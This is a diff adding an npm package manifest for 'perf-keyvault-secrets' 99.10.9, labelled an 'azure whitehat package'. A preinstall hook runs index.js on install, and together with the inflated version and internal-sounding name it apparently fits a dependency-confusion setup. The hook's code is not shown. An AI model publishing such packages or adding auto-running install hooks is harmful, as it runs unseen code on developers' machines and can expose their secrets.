@@ -1,0 +1,39 @@
+{
+    "name": "perf-keyvault-secrets",
+    "version": "99.10.9",
+    "description": "azure whitehat package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo \"error no test specified\" && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "perf-keyvault-secrets@99.10.9",
+    "_nodeVersion": "14.16.1",
+    "_npmVersion": "6.14.11",
+    "dist": {
+        "integrity": "sha512-uolmyIC0bV+N0t5VAK3F4noRxBLX5hur+CXDzEMG/0+14Iz9pEUc5Vuc0R98WHbs+lXvAfR/L9t/gvrAsyNX8g==",
+        "shasum": "b54f893736934e1177bd2f95d48f4b89353f0321",
+        "tarball": "https://registry.npmjs.org/perf-keyvault-secrets/-/perf-keyvault-secrets-99.10.9.tgz",
+        "fileCount": 2,
+        "unpackedSize": 3585,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v3.0.13\r\nComment: https://openpgpjs.org\r\n\r\nwsFcBAEBCAAQBQJhon3eCRA9TVsSAnZWagAANZ0P/RHrlEwJSKN/+CfiB+HB\nMz+gzK4GrUZ6d8GbtB1wSnvnmoe1wYlOSRG1IGQu4BFpMD8ZgEG80iFw+Ao9\nS1buOzynKQuMOqL5emTayxibQRM9F5Aj0+1iHyp1+asHtkuPXNtw0Ex27gfG\nBtv+thCdWpmeZGV2lIGw3DKOJJrYb3LiQJ9Ls+iTtY5aFlLITTTGUDj8Xdqa\nb1AEcf6ftnOAHRkwgnQp2w8ExPYSa927R1cRmYa9uup7azoqNbTUfEaAGG7n\nY91xLgDh3IvHxbyQfZfhbxIuF8gycqvQYgUgVQTCLZy1UEZyLVREoXWYyOn3\n9e3Z+fMvxev9RcxGSH5+UMQC1NEp4RAhwLd+dckpWp1I/2G//vF1PdK/42s/\nbmB/7xFCR95WbIy485CQnhYEaeuzZZFvdtPEKX0j6KhWgdFg3QcxusV+XGoX\nqgg3Ht6HAP48yCGJZ9zLuZlUdlLU2+Bkac5BkDt/N71yu4r9qcHM5C05vVc2\njCwJuO7nyJzLACfULr3bCwY4jaQTKr/U9ywM4txj6GyB2ObZHl2fkV0NKx2+\n0Isp9rVh0FgLs6lxZO3AOVXnUNewd/y5Bvz2vmbwg0y/fG9UPBy/D9+oIlzX\noK9iV2Pg3mV7qdK8nWpshAlZ/XK/xmvjVojM0WSXAWmdHvYk1jml2ho8Kf0H\ndWEA\r\n=WcRK\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "rt11",
+        "email": "hussam.tes08@gmail.com"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "rt11",
+            "email": "hussam.tes08@gmail.com"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/perf-keyvault-secrets_99.10.9_1638039006078_0.6777119569865395"
+    },
+    "_hasShrinkwrap": false
+}
